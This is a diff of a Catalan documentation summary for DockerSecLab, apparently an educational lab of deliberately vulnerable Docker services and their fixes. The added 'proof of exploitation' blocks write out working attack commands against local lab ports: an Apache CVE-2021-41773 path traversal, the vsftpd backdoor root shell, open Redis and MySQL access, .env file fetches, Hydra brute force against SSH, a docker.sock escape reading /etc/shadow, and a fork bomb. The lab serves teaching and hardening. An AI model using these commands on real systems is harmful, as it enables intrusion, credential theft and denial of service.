@@ -6,247 +6,271 @@
 
 ## Descripció
 
-Aquest document recull el resum de totes les vulnerabilitats documentades al projecte DockerSecLab. El projecte esta dividit en dues categories principals: vulnerabilitats de configuracio de Docker i vulnerabilitats de serveis reals.
+Aquest document recull el resum de totes les vulnerabilitats documentades al projecte DockerSecLab. El catàleg està organitzat en tres categories: vulnerabilitats de serveis exposats per xarxa, vulnerabilitats de configuració de serveis, i vulnerabilitats de configuració del contenidor/host.
 
 ---
 
-## Index General
+## Índex General
 
-| Num | Vulnerabilitat | Categoria | Risc |
-|---|---|---|---|
-| 1 | running-as-root | Configuracio Docker | Alt |
-| 2 | exposed-ports | Configuracio Docker - Xarxa | Alt |
-| 3 | hardcoded-credentials | Configuracio Docker | Critic |
-| 4 | obsolete-versions | Configuracio Docker | Alt |
-| 5 | no-resource-limits | Configuracio Docker - Host | Alt |
-| 6 | unnecessary-capabilities | Configuracio Docker - Host | Alt |
-| 7 | dangerous-mounts | Configuracio Docker - Host | Critic |
-| 8 | unencrypted-communication | Configuracio Docker - Xarxa | Alt |
-| 9 | insecure-network-config | Configuracio Docker - Xarxa | Alt |
-| S1 | Apache CVE-2021-41773 | Serveis | Critic |
-| S2 | Nginx Misconfiguracio | Serveis | Alt |
-| S3 | MySQL Credencials Febles | Serveis | Critic |
-| S4 | SSH Configuracio Insegura | Serveis | Alt |
-| S5 | vsftpd CVE-2011-2523 | Serveis | Critic |
+| Num | Servei / Vulnerabilitat | Categoria | Risc | CVE / CWE |
+|---|---|---|---|---|
+| 1 | Apache 2.4.49 - Path Traversal + RCE | Xarxa | Crític | CVE-2021-41773 |
+| 2 | vsftpd 2.3.4 - Backdoor | Xarxa | Crític | CVE-2011-2523 |
+| 3 | Redis - Sense autenticació | Xarxa | Alt | CWE-287 |
+| 4 | MySQL - Root sense contrasenya | Configuració | Crític | CWE-521 |
+| 5 | Nginx - Directory listing | Configuració | Alt | CWE-548 |
+| 6 | SSH - PermitRootLogin + pass feble | Configuració | Alt | CWE-521 |
+| 7 | Muntatges perillosos (/, docker.sock) | Contenidor/Host | Crític | CWE-284 |
+| 8 | Sense límits de recursos | Contenidor/Host | Alt | CWE-400 |
+| 9 | Capabilities innecessàries | Contenidor/Host | Alt | CWE-250 |
 
 ---
 
-## Part 1 - Vulnerabilitats de Configuracio Docker
+## Categoria: Xarxa
 
-### Categoria: Configuracio de Serveis
+### Vulnerabilitat 1 - Apache 2.4.49 CVE-2021-41773
 
-#### Vulnerabilitat 1 - Execucio com a Root
-**Ubicacio:** `vulnerabilities/configuration/running-as-root/`
-**Documentacio:** `documentation/vulnerabilities/1-running-as-root.md`
-**Nivell de risc:** Alt | **CWE:** CWE-250
-
-Per defecte, els processos dins d'un contenidor Docker s'executen com a root si no s'especifica cap usuari al Dockerfile.
-
-**Solucio aplicada:** Creacio d'un usuari no privilegiat amb UID fix i us de la directiva USER.
-
----
-
-#### Vulnerabilitat 3 - Credencials Hardcodejades
-**Ubicacio:** `vulnerabilities/configuration/hardcoded-credentials/`
-**Documentacio:** `documentation/vulnerabilities/3-hardcoded-credentials.md`
-**Nivell de risc:** Critic | **CWE:** CWE-798
-
-Credencials visibles al Dockerfile i a l'historial de commits de GitHub permanentment.
-
-**Solucio aplicada:** Variables buides al Dockerfile i fitxer .env extern no inclòs al repositori.
-
----
-
-#### Vulnerabilitat 4 - Versions Obsoletes
-**Ubicacio:** `vulnerabilities/configuration/obsolete-versions/`
-**Documentacio:** `documentation/vulnerabilities/4-obsolete-versions.md`
-**Nivell de risc:** Alt | **CWE:** CWE-1104
-
-Ubuntu 20.04 (EOL) amb PHP 7.4 (EOL) sense pegats de seguretat oficials disponibles.
-
-**Solucio aplicada:** Ubuntu 22.04 + PHP 8.1 amb suport actiu.
-
----
-
-### Categoria: Xarxa
-
-#### Vulnerabilitat 2 - Exposicio Innecessaria de Ports
-**Ubicacio:** `vulnerabilities/network/exposed-ports/`
-**Documentacio:** `documentation/vulnerabilities/2-exposed-ports.md`
-**Nivell de risc:** Alt | **CWE:** CWE-16
-
-Ports de serveis sensibles com bases de dades o SSH accessibles des de l'exterior.
-
-**Solucio aplicada:** Exposar nomes el port estrictament necessari per a l'aplicacio.
-
----
-
-#### Vulnerabilitat 8 - Comunicacio No Xifrada
-**Ubicacio:** `vulnerabilities/network/unencrypted-communication/`
-**Documentacio:** `documentation/vulnerabilities/8-unencrypted-communication.md`
-**Nivell de risc:** Alt | **CWE:** CWE-319
-
-HTTP sense xifrar permet interceptar credencials i dades sensibles en transit.
-
-**Solucio aplicada:** Apache amb SSL/TLS i certificat autosignat.
-
----
-
-#### Vulnerabilitat 9 - Configuracio de Xarxa Insegura
-**Ubicacio:** `vulnerabilities/network/insecure-network-config/`
-**Documentacio:** `documentation/vulnerabilities/9-insecure-network-config.md`
-**Nivell de risc:** Alt | **CWE:** CWE-284
-
-Binding a 0.0.0.0 i manca de segmentacio entre contenidors.
-
-**Solucio aplicada:** Binding a 127.0.0.1 i xarxes Docker segmentades amb internal: true.
-
----
-
-### Categoria: Contenidor/Host
-
-#### Vulnerabilitat 5 - Sense Limits de Recursos
-**Ubicacio:** `vulnerabilities/container-host/no-resource-limits/`
-**Documentacio:** `documentation/vulnerabilities/5-no-resource-limits.md`
-**Nivell de risc:** Alt | **CWE:** CWE-400
-
-Un contenidor sense limits pot consumir tots els recursos del host causant DoS.
-
-**Solucio aplicada:** Limits de CPU i memoria definits al docker-compose.yml.
-
----
-
-#### Vulnerabilitat 6 - Capabilities Innecessaries
-**Ubicacio:** `vulnerabilities/container-host/unnecessary-capabilities/`
-**Documentacio:** `documentation/vulnerabilities/6-unnecessary-capabilities.md`
-**Nivell de risc:** Alt | **CWE:** CWE-250
-
-Capabilities excessives com CAP_NET_RAW permeten sniffing i possible escapament al host.
-
-**Solucio aplicada:** cap_drop: ALL i cap_add nomes amb les capabilities necessaries.
-
----
-
-#### Vulnerabilitat 7 - Muntatges Perillosos
-**Ubicacio:** `vulnerabilities/container-host/dangerous-mounts/`
-**Documentacio:** `documentation/vulnerabilities/7-dangerous-mounts.md`
-**Nivell de risc:** Critic | **CWE:** CWE-284
-
-Muntar / o /var/run/docker.sock permet escapament complet al host.
-
-**Solucio aplicada:** Eliminar muntatges del sistema i usar :ro per a nomes lectura.
-
----
-
-## Part 2 - Vulnerabilitats de Serveis
-
-### Servei 1 - Apache CVE-2021-41773
-**Ubicacio:** `vulnerabilities/services/apache/`
-**Documentacio:** `documentation/vulnerabilities/s1-apache-cve-2021-41773.md`
-**Nivell de risc:** Critic | **CVE:** CVE-2021-41773 | **CVSS:** 9.8
+**Ubicació:** `vulnerabilities/network/apache/`
+**Documentació:** `documentation/vulnerabilities/1-apache-cve-2021-41773.md`
+**Nivell de risc:** Crític | **CVE:** CVE-2021-41773 | **CVSS:** 9.8
 **Ports:** Vulnerable: 9001 | Fixed: 9002
 
-Apache 2.4.49 permet Path Traversal i RCE via CGI. Explotada activament en la natura.
+Una fallada en la normalització de paths a Apache 2.4.49 permet a un atacant fer path traversal fora del directori arrel del servidor. Si el mòdul CGI està actiu, la vulnerabilitat permet execució remota de codi (RCE) sense autenticació. Va ser explotada activament en la natura pocs dies després de la seva publicació.
 
-**Solucio aplicada:** Actualitzacio a Apache 2.4.51+ i desactivacio de CGI.
+**Prova d'explotació:**
+```bash
+curl --path-as-is http://localhost:9001/cgi-bin/.%2e/.%2e/.%2e/etc/passwd
+```
+
+**Solució aplicada:** Actualització a Apache 2.4.51+ des dels repositoris oficials i desactivació del mòdul CGI.
 
 ---
 
-### Servei 2 - Nginx Misconfiguracio
-**Ubicacio:** `vulnerabilities/services/nginx/`
-**Documentacio:** `documentation/vulnerabilities/s2-nginx-misconfiguracio.md`
+### Vulnerabilitat 2 - vsftpd 2.3.4 CVE-2011-2523
+
+**Ubicació:** `vulnerabilities/network/ftp/`
+**Documentació:** `documentation/vulnerabilities/2-ftp-vsftpd-backdoor.md`
+**Nivell de risc:** Crític | **CVE:** CVE-2011-2523 | **CVSS:** 10.0
+**Ports:** Vulnerable: 2121 | Fixed: 2122
+
+El codi font de vsftpd 2.3.4 va ser compromès i es va introduir un backdoor intencionat. Quan un usuari envia un nom d'usuari que conté el caràcter ':)', el servidor obre una shell amb privilegis root al port 6200 sense cap autenticació addicional. Va romandre al repositori oficial durant varios mesos.
+
+**Prova d'explotació:**
+```bash
+# Connexió FTP amb backdoor trigger
+echo -e "USER hacker:)\nPASS hacker" | nc localhost 2121
+# Connexió a la shell oberta
+nc localhost 6200
+```
+
+**Solució aplicada:** Actualització a vsftpd 3.0.x instal·lat des dels repositoris oficials del sistema operatiu.
+
+---
+
+### Vulnerabilitat 3 - Redis sense autenticació
+
+**Ubicació:** `vulnerabilities/network/redis/`
+**Documentació:** `documentation/vulnerabilities/3-redis-sense-autenticacio.md`
+**Nivell de risc:** Alt | **CWE:** CWE-287
+**Ports:** Vulnerable: 6380 | Fixed: 6381 (només local)
+
+Redis es configura per defecte per escoltar únicament a localhost. Quan un administrador canvia el binding a 0.0.0.0 sense afegir autenticació (requirepass), qualsevol atacant que arribi al port 6379 pot llegir, modificar o eliminar totes les dades emmagatzemades, incloent secrets, tokens i contrasenyes. Milers d'instàncies Redis han estat compromeses per aquest motiu.
+
+**Prova d'explotació:**
+```bash
+redis-cli -p 6380 ping
+redis-cli -p 6380 KEYS "*"
+redis-cli -p 6380 GET secret_key
+```
+
+**Solució aplicada:** Binding restringit a 127.0.0.1, requirepass obligatori i desactivació de comandes perilloses (FLUSHALL, CONFIG, DEBUG).
+
+---
+
+## Categoria: Configuració de Serveis
+
+### Vulnerabilitat 4 - MySQL root sense contrasenya
+
+**Ubicació:** `vulnerabilities/configuration/mysql/`
+**Documentació:** `documentation/vulnerabilities/4-mysql-credencials-febles.md`
+**Nivell de risc:** Crític | **CWE:** CWE-521
+**Ports:** Vulnerable: 3308 | Fixed: 3309 (només local)
+
+MySQL configurat amb l'usuari root sense contrasenya i amb bind-address a 0.0.0.0 permet a qualsevol atacant que arribi al port 3306 connectar-se com a administrador sense autenticació i accedir, modificar o eliminar totes les bases de dades del servidor.
+
+**Prova d'explotació:**
+```bash
+mysql -h 127.0.0.1 -P 3308 -u root
+# Sense contrasenya: accés complet
+SHOW DATABASES;
+SELECT * FROM dades_sensibles.usuaris;
+```
+
+**Solució aplicada:** bind-address restringit a 127.0.0.1, contrasenya forta per a root, eliminació d'usuaris anònims i creació d'un usuari d'aplicació amb privilegis mínims.
+
+---
+
+### Vulnerabilitat 5 - Nginx directory listing i fitxers sensibles
+
+**Ubicació:** `vulnerabilities/configuration/nginx/`
+**Documentació:** `documentation/vulnerabilities/5-nginx-misconfiguracio.md`
 **Nivell de risc:** Alt | **CWE:** CWE-548
 **Ports:** Vulnerable: 9003 | Fixed: 9004
 
-Directory listing i server_tokens on permeten enumerar fitxers i obtenir la versio exacta.
+Nginx configurat amb autoindex on permet llistar el contingut de directoris. A més, si no es bloquegen explícitament les extensions de fitxers sensibles (.env, .conf, .sql, .bak), un atacant pot accedir directament a fitxers de configuració amb credencials, claus d'API o contrasenyes de bases de dades.
 
-**Solucio aplicada:** autoindex off, server_tokens off i bloqueig de fitxers sensibles.
+**Prova d'explotació:**
+```bash
+# Llistat de directoris
+curl http://localhost:9003/
 
----
+# Accés a fitxers sensibles
+curl http://localhost:9003/.env
+curl http://localhost:9003/config.conf
+```
 
-### Servei 3 - MySQL Credencials Febles
-**Ubicacio:** `vulnerabilities/services/mysql/`
-**Documentacio:** `documentation/vulnerabilities/s3-mysql-credencials-febles.md`
-**Nivell de risc:** Critic | **CWE:** CWE-521
-**Ports:** Vulnerable: 3308 | Fixed: 3309 (nomes local)
-
-MySQL accessible remotament sense contrasenya de root permet acces i exfiltracio completa.
-
-**Solucio aplicada:** bind-address 127.0.0.1, contrasenya forta i eliminacio d'usuaris anonims.
+**Solució aplicada:** autoindex off, server_tokens off i bloqueig explícit de fitxers sensibles retornant 404.
 
 ---
 
-### Servei 4 - SSH Configuracio Insegura
-**Ubicacio:** `vulnerabilities/services/ssh/`
-**Documentacio:** `documentation/vulnerabilities/s4-ssh-configuracio-insegura.md`
+### Vulnerabilitat 6 - SSH PermitRootLogin i contrasenya feble
+
+**Ubicació:** `vulnerabilities/configuration/ssh/`
+**Documentació:** `documentation/vulnerabilities/6-ssh-configuracio-insegura.md`
 **Nivell de risc:** Alt | **CWE:** CWE-521
 **Ports:** Vulnerable: 2223 | Fixed: 2224
 
-PermitRootLogin yes amb contrasenya feble permet acces root via força bruta automatitzada.
+OpenSSH configurat amb PermitRootLogin yes i PasswordAuthentication yes permet atacs de força bruta directament contra el compte root. Amb una contrasenya feble com root:root123, eines automatitzades com Hydra poden obtenir accés root al sistema en pocs minuts.
 
-**Solucio aplicada:** PermitRootLogin no, nomes clau publica i MaxAuthTries 3.
+**Prova d'explotació:**
+```bash
+# Força bruta amb Hydra
+hydra -l root -P /usr/share/wordlists/rockyou.txt \
+  ssh://localhost:2223
+
+# Accés directe un cop trobada la contrasenya
+ssh root@localhost -p 2223
+```
+
+**Solució aplicada:** PermitRootLogin no, PasswordAuthentication no, només autenticació per clau pública i MaxAuthTries 3.
 
 ---
 
-### Servei 5 - vsftpd CVE-2011-2523 Backdoor
-**Ubicacio:** `vulnerabilities/services/ftp/`
-**Documentacio:** `documentation/vulnerabilities/s5-ftp-vsftpd-backdoor.md`
-**Nivell de risc:** Critic | **CVE:** CVE-2011-2523 | **CVSS:** 10.0
-**Ports:** Vulnerable: 2121 | Fixed: 2122
+## Categoria: Configuració del Contenidor/Host
 
-Backdoor al codi font de vsftpd 2.3.4 que obre shell root al port 6200 sense autenticacio.
+### Vulnerabilitat 7 - Muntatges perillosos
 
-**Solucio aplicada:** Actualitzacio a vsftpd 3.0.x des dels repositoris oficials del sistema.
+**Ubicació:** `vulnerabilities/container-host/dangerous-mounts/`
+**Documentació:** `documentation/vulnerabilities/7-dangerous-mounts.md`
+**Nivell de risc:** Crític | **CWE:** CWE-284
+**Ports:** Vulnerable: 8093 | Fixed: 8094
+
+Muntar l'arrel del sistema host (/) o el socket de Docker (/var/run/docker.sock) permet que un atacant que comprometi el contenidor obtingui control total sobre el host. Accedint al socket de Docker, es poden crear nous contenidors privilegiats que muntin el sistema de fitxers del host i escapar completament del contenidor.
+
+**Prova d'explotació:**
+```bash
+# Llegir fitxers del host des del contenidor
+docker exec vuln-dangerous-mounts cat /host/etc/shadow
+
+# Escapament via docker.sock
+docker exec vuln-dangerous-mounts \
+  docker run -v /:/host --rm -it alpine chroot /host
+```
+
+**Solució aplicada:** Eliminar tots els muntatges del sistema host i muntar únicament el directori de dades de l'aplicació en mode de només lectura (:ro).
+
+---
+
+### Vulnerabilitat 8 - Sense límits de recursos
+
+**Ubicació:** `vulnerabilities/container-host/no-resource-limits/`
+**Documentació:** `documentation/vulnerabilities/8-no-resource-limits.md`
+**Nivell de risc:** Alt | **CWE:** CWE-400
+**Ports:** Vulnerable: 8089 | Fixed: 8090
+
+Sense límits de CPU, memòria o I/O definits, un sol contenidor pot consumir tots els recursos del sistema host, causant una denegació de servei (DoS) que afecti tots els altres contenidors i el propi sistema operatiu.
+
+**Prova d'explotació:**
+```bash
+# Fork bomb des del contenidor vulnerable
+docker exec vuln-no-resource-limits bash -c ":(){ :|:& };:"
+
+# Monitoritzar consum
+docker stats
+```
+
+**Solució aplicada:** Definició de límits i reserves de CPU i memòria al docker-compose.yml amb el bloc deploy.resources (cpus: 0.50, memory: 256M).
+
+---
+
+### Vulnerabilitat 9 - Capabilities innecessàries
+
+**Ubicació:** `vulnerabilities/container-host/unnecessary-capabilities/`
+**Documentació:** `documentation/vulnerabilities/9-unnecessary-capabilities.md`
+**Nivell de risc:** Alt | **CWE:** CWE-250
+**Ports:** Vulnerable: 8091 | Fixed: 8092
+
+Docker assigna per defecte un conjunt de capabilities als contenidors que en molts casos són excessives. CAP_NET_RAW permet sniffing de xarxa, CAP_SYS_ADMIN permet muntatges i moltes operacions privilegiades, i CAP_SETUID permet canviar d'usuari. Un atacant que comprometi el contenidor pot aprofitar-les per escalar privilegis.
+
+**Prova d'explotació:**
+```bash
+# Sniffing de xarxa amb CAP_NET_RAW
+docker exec vuln-unnecessary-capabilities \
+  tcpdump -i eth0 -n
+
+# Verificar capabilities actives
+docker exec vuln-unnecessary-capabilities capsh --print
+```
+
+**Solució aplicada:** cap_drop: ALL per eliminar totes les capabilities i cap_add únicament amb NET_BIND_SERVICE, més security_opt: no-new-privileges:true.
 
 ---
 
 ## Resum per Nivell de Risc
 
-### Critic
-- Vulnerabilitat 3: Credencials Hardcodejades
-- Vulnerabilitat 7: Muntatges Perillosos
-- Servei 1: Apache CVE-2021-41773
-- Servei 3: MySQL Credencials Febles
-- Servei 5: vsftpd CVE-2011-2523
+### Crític
+- Vulnerabilitat 1: Apache 2.4.49 CVE-2021-41773
+- Vulnerabilitat 2: vsftpd 2.3.4 CVE-2011-2523
+- Vulnerabilitat 4: MySQL root sense contrasenya
+- Vulnerabilitat 7: Muntatges perillosos
 
 ### Alt
-- Vulnerabilitat 1: Execucio com a Root
-- Vulnerabilitat 2: Exposicio Innecessaria de Ports
-- Vulnerabilitat 4: Versions Obsoletes
-- Vulnerabilitat 5: Sense Limits de Recursos
-- Vulnerabilitat 6: Capabilities Innecessaries
-- Vulnerabilitat 8: Comunicacio No Xifrada
-- Vulnerabilitat 9: Configuracio de Xarxa Insegura
-- Servei 2: Nginx Misconfiguracio
-- Servei 4: SSH Configuracio Insegura
+- Vulnerabilitat 3: Redis sense autenticació
+- Vulnerabilitat 5: Nginx directory listing
+- Vulnerabilitat 6: SSH PermitRootLogin
+- Vulnerabilitat 8: Sense límits de recursos
+- Vulnerabilitat 9: Capabilities innecessàries
 
 ---
 
-## Eines Utilitzades
+## Eines Utilitzades per a la Verificació
 
-| Eina | Funcio |
+| Eina | Funció |
 |---|---|
 | Trivy | Escaneig de vulnerabilitats en imatges Docker |
 | nmap | Descobriment de ports i versions de serveis |
 | Hydra | Proves de força bruta (SSH, FTP) |
-| tcpdump | Captura i analisi de trafic de xarxa |
-| Metasploit | Explotacio de CVEs (vsftpd backdoor) |
-| docker inspect | Inspeccio de configuracio de contenidors |
-| capsh | Verificacio de capabilities actives |
-| docker stats | Monitoritzacio de consum de recursos |
+| tcpdump | Captura i anàlisi de tràfic de xarxa |
+| redis-cli | Proves d'accés a Redis sense autenticació |
+| mysql-client | Proves d'accés a MySQL sense contrasenya |
+| nc (netcat) | Detecció de banners i proves de connexió |
 | curl | Proves de vulnerabilitats web (Apache, Nginx) |
+| capsh | Verificació de capabilities actives |
+| docker stats | Monitorització de consum de recursos |
+| docker inspect | Inspecció de configuració de contenidors |
 
 ---
 
-## References Generals
+## Referències Generals
 
+- [NVD - CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)
+- [NVD - CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
 - [Docker Security Documentation](https://docs.docker.com/engine/security/)
 - [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker)
 - [OWASP Docker Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)
-- [NVD - National Vulnerability Database](https://nvd.nist.gov/)
 - [Trivy - Vulnerability Scanner](https://github.com/aquasecurity/trivy)
 
 ---
 
-**Ultima actualitzacio:** Marc 2026
+**Ultima actualitzacio:** Abril 2026
 **Versio:** 2.0.0
